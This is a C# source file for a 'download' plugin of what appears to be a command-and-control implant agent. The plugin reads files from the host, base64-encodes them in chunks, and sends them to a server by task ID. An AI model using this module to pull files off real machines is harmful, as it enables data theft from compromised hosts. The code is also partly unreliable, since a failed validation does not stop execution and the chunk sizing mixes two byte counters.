using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System;
using System.Collections.Concurrent;
using System.Text.Json;
using System.Security.Principal;

namespace Agent
{
    public class Plugin : IFilePlugin
    {
        public string Name => "download";
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ITokenManager tokenManager { get; set; }
        private ConcurrentDictionary<string, ServerDownloadJob> downloadJobs { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.logger = logger;
            this.downloadJobs = new ConcurrentDictionary<string, ServerDownloadJob>();
            this.tokenManager = tokenManager;
        }

        public async Task Execute(ServerJob job)
        {
            DownloadArgs args = JsonSerializer.Deserialize<DownloadArgs>(job.task.parameters);

            if(!args.Validate(out var message))
            {
                await messageManager.AddResponse(new DownloadResponse
                {
                    status = "error",
                    process_response = new Dictionary<string, string> { { "message", message } },
                    completed = true,
                    task_id = job.task.id
                }.ToJson());
            }
            ServerDownloadJob downloadJob = new ServerDownloadJob(job, args);

            downloadJob.total_chunks = await GetTotalChunks(downloadJob);

            if(downloadJob.total_chunks == 0)
            {
                await messageManager.AddResponse(new DownloadResponse
                {
                    status = "error",
                    process_response = new Dictionary<string, string> { { "message", "Failed calculating number of messages" } },
                    completed = true,
                    task_id = job.task.id
                }.ToJson());
                this.CompleteDownloadJob(job.task.id);
                return;
            }


            //Add the job to the list of jobs
            downloadJobs.GetOrAdd(job.task.id, downloadJob);

            //Send the first response, start download process.
            await messageManager.AddResponse(new DownloadResponse
            {
                user_output = $"Download Started.",
                download = new DownloadResponseData()
                {
                    total_chunks = downloadJob.total_chunks,
                    full_path = downloadJob.path,
                    chunk_num = 0,
                    chunk_data = string.Empty,
                    is_screenshot = false,
                    host = "",
                },
                status = "processed",
                task_id = job.task.id,
                completed = false,
            }.ToJson());
        }

        public async Task HandleNextMessage(ServerResponseResult response)
        {
            //Get Tracker job
            ServerDownloadJob downloadJob = this.GetJob(response.task_id);
 
            if(response.status != "success" || downloadJob.cancellationtokensource.IsCancellationRequested)
            {
                string message = "Cancelled by user.";
                if (response.status != "success")
                {
                    message = "An error occurred while communicating with the server.";
                }
                await this.messageManager.WriteLine(message, response.task_id, true, "error");
                this.CompleteDownloadJob(response.task_id);
                return;
            }

            if (string.IsNullOrEmpty(downloadJob.file_id))
            {
                downloadJob.file_id = response.file_id;
            }

            downloadJob.chunk_num++;
            bool completed = (downloadJob.chunk_num == downloadJob.total_chunks);
            //Prepare download response
            DownloadResponse dr = new DownloadResponse()
            {
                task_id = response.task_id,
                user_output = completed ? $"{downloadJob.file_id}" : String.Empty,
                //user_output = downloadJob.chunk_num.ToString(),
                download = new DownloadResponseData
                {
                    is_screenshot = false,
                    host = "",
                    file_id = downloadJob.file_id,
                    full_path = downloadJob.path,
                    chunk_num = downloadJob.chunk_num,
                },
                status = completed ? String.Empty : "processed",
                completed = (downloadJob.chunk_num == downloadJob.total_chunks),
            };


            var tuple = await this.TryHandleNextChunk(downloadJob);

            if (tuple.Item1)
            {
                dr.download.chunk_data = tuple.Item2;
            }
            else
            {
                dr.download.chunk_data = String.Empty;
                dr.user_output = tuple.Item2;
                dr.status = "error";
                this.CompleteDownloadJob(response.task_id);
            }

            await messageManager.AddResponse(dr.ToJson());

            if (dr.completed)
            {
                this.CompleteDownloadJob(response.task_id);
            }
        }
        /// <summary>
        /// Return the number of chunks required to download the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        private async Task<int> GetTotalChunks(ServerDownloadJob job)
        {
            try
            {
                var fi = new FileInfo(job.path);
                //int total_chunks = (int)(fi.Length + job.chunk_size - 1) / job.chunk_size;
                return (int)Math.Ceiling((double)fi.Length / job.chunk_size);
            }
            catch
            {
                return 0;
            }
        }
        /// <summary>
        /// Complete and remove the download job from our tracker
        /// </summary>
        /// <param name="task_id">The task ID of the download job to complete</param>
        public void CompleteDownloadJob(string task_id)
        {
            downloadJobs.Remove(task_id, out _);
            this.messageManager.CompleteJob(task_id);
        }
        /// <summary>
        /// Read the next chunk from the file
        /// </summary>
        /// <param name="job">Download job that's being tracked</param>
        public async Task<Tuple<bool,string>> TryHandleNextChunk(ServerDownloadJob job)
        {
            try
            {
                if (job.total_chunks == 1)
                {
                    job.complete = true;
                    return new Tuple<bool, string>(true,Misc.Base64Encode(await File.ReadAllBytesAsync(job.path)));
                }
                long totalBytesRead = job.chunk_size * (job.chunk_num - 1);

                using (var fileStream = new FileStream(job.path, FileMode.Open, FileAccess.Read))
                {
                    byte[] buffer = new byte[job.chunk_size];

                    FileInfo fileInfo = new FileInfo(job.path);

                    if (fileInfo.Length - totalBytesRead < job.chunk_size)
                    {
                        job.complete = true;
                        buffer = new byte[fileInfo.Length - job.bytesRead];
                    }

                    fileStream.Seek(job.bytesRead, SeekOrigin.Begin);
                    job.bytesRead += fileStream.Read(buffer, 0, buffer.Length);
                    return new Tuple<bool, string>(true, Misc.Base64Encode(buffer));
                };
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
                job.complete = true;
                return new Tuple<bool, string>(false, e.ToString());
            }
        }
        /// <summary>
        /// Get a download job by ID
        /// </summary>
        /// <param name="task_id">ID of the download job</param>
        public ServerDownloadJob GetJob(string task_id)
        {
            return downloadJobs[task_id];
        }
    }
}
